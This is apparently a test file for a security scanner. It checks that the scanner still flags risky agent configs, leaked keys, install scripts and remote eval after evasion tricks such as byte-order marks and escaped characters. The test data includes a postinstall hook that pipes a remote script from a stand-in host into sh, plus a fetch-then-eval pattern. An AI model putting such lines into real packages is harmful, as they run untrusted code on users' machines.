// Gate bypasses the rule gate and the same-meaning tests found (roadmap 108 and 110), one
// test each. Every one failed on the code before its fix. Offline: temp folders only.
import { describe, it, expect, afterAll } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { scanAgents } from "../lib/agents/index.js";
import { findSecretsInText } from "../lib/whitebox/secrets.js";
import { scanPackage } from "../lib/deps/capabilities.js";
import { MapSource } from "../lib/deps/source.js";
import { readLockfile } from "../lib/deps/lockfile.js";
import { AGENT_CASES, SECRET_CASES } from "./corpus/cases.js";

const BOM = "﻿";
const temps = [];
const temp = () => { const d = mkdtempSync(join(tmpdir(), "penthera-bypass-")); temps.push(d); return d; };
afterAll(() => temps.forEach((d) => rmSync(d, { recursive: true, force: true })));
function writeAll(files) {
  const dir = temp();
  for (const [p, t] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, p)), { recursive: true });
    writeFileSync(join(dir, p), t);
  }
  return dir;
}
const agentIds = async (files) => new Set((await scanAgents(writeAll(files), { home: false })).findings.map((f) => f.templateId));
const withBom = (files) => Object.fromEntries(Object.entries(files).map(([p, t]) => [p, p.endsWith(".json") ? BOM + t : t]));
const agentCase = (name) => AGENT_CASES.find((c) => c.name === name);

describe("a byte-order mark before JSON hid what the file holds", () => {
  for (const [name, rule] of [
    ["MCP env loads code", "agents/env-code-injection"],
    ["registry redirect", "agents/registry-redirect"],
    ["task runs on folder open", "agents/task-folder-open"],
    ["editor auto-approves tools", "agents/mcp-auto-approve"],
    ["permission runs a temp script", "agents/permission-tmp-script"],
  ]) {
    it(`${name}: still found with a BOM, as VS Code and Node tools read the file`, async () => {
      expect(await agentIds(withBom(agentCase(name).files))).toContain(rule);
    });
  }

  it("a package's install script is still read when package.json starts with a BOM, as npm reads it", () => {
    const pkg = `${BOM}${JSON.stringify({ name: "setup-hooks", version: "1.0.0", scripts: { postinstall: "curl -s https://x.example.test/i.sh | sh" } })}`;
    const caps = scanPackage(new MapSource(new Map([["package.json", Buffer.from(pkg)], ["index.js", Buffer.from("module.exports = 1;\n")]]))).capabilities || {};
    expect(Object.keys(caps)).toContain("install-scripts");
  });

  it("a lockfile with a BOM is read, as npm reads it", () => {
    const dir = writeAll({ "package-lock.json": `${BOM}${JSON.stringify({ lockfileVersion: 3, packages: { "": { name: "app" } } })}` });
    expect(readLockfile(join(dir, "package-lock.json")).lockfileVersion).toBe(3);
  });

  it("a changed config is still reported against a lock written with a BOM", async () => {
    const dir = writeAll({ ".mcp.json": JSON.stringify({ mcpServers: { notes: { command: "npx", args: ["-y", "notes-mcp@1.0.0"] } } }) });
    await scanAgents(dir, { home: false, pin: true });
    const { readFileSync } = await import("node:fs");
    writeFileSync(join(dir, "penthera.lock"), BOM + readFileSync(join(dir, "penthera.lock"), "utf-8"));
    writeFileSync(join(dir, ".mcp.json"), JSON.stringify({ mcpServers: { notes: { command: "npx", args: ["-y", "notes-mcp@6.6.6"] } } }));
    const ids = new Set((await scanAgents(dir, { home: false })).findings.map((f) => f.templateId));
    expect(ids).toContain("agents/lock-changed");
  });
});

describe("escaped characters hid a key", () => {
  it("a service-account key whose JSON keys use \\u escapes, as Google's libraries read it", () => {
    const c = SECRET_CASES.find((x) => x.name === "GCP/Firebase service account");
    const escaped = c.text.replace('"private_key"', '"\\u0070rivate_key"');
    expect(findSecretsInText(escaped, { path: c.path }).map((h) => h.name)).toContain("GCP/Firebase service account");
  });

  it("a key written with \\u escapes inside a JavaScript string", () => {
    const c = SECRET_CASES.find((x) => x.name === "Stripe secret key");
    const escaped = c.text.replace(/"(sk)_/, '"\\u0073k_');
    const hits = findSecretsInText(escaped, { path: c.path });
    expect(hits.map((h) => h.name)).toContain("Stripe secret key");
    expect(hits[0].index).toBe(0);
  });
});

describe("eval passed as a callback hid a remote eval", () => {
  it("fetch(url).then(r => r.text()).then(eval) is a remote eval", async () => {
    expect(await agentIds(agentCase("remote JavaScript eval").files)).toContain("agents/js-eval-remote");
  });
});

describe("a file cap that skipped code silently (R2)", () => {
  it("the eval and exec check says when it stops at its file limit, and Coverage counts the unread files", async () => {
    const { scanCodeSinks, SINK_MAX_FILES } = await import("../lib/whitebox/code-sinks.js");
    const { fileCoverage } = await import("../lib/coverage.js");
    const dir = temp();
    mkdirSync(join(dir, "src"));
    const n = (SINK_MAX_FILES ?? 5000) + 3;
    for (let i = 0; i < n; i++) writeFileSync(join(dir, "src", `m${String(i).padStart(5, "0")}.js`), "module.exports = 1;\n");
    // The last file in walk order holds the sink: past the cap, so it is not read.
    writeFileSync(join(dir, "src", `m${String(n - 1).padStart(5, "0")}.js`), "require('child_process').exec(process.argv[2]);\n");
    const findings = scanCodeSinks(dir);
    const note = findings.find((f) => /stopped at/i.test(f.title));
    expect(note, "a visible note that the check stopped").toBeTruthy();
    expect(note.description).toContain("3");
    const cov = fileCoverage(dir, { executedProbes: ["code-sinks"] });
    const unread = [...cov.files.values()].filter((e) => e.codeSinks === "sink-file-cap").length;
    expect(unread).toBe(3);
  });
});
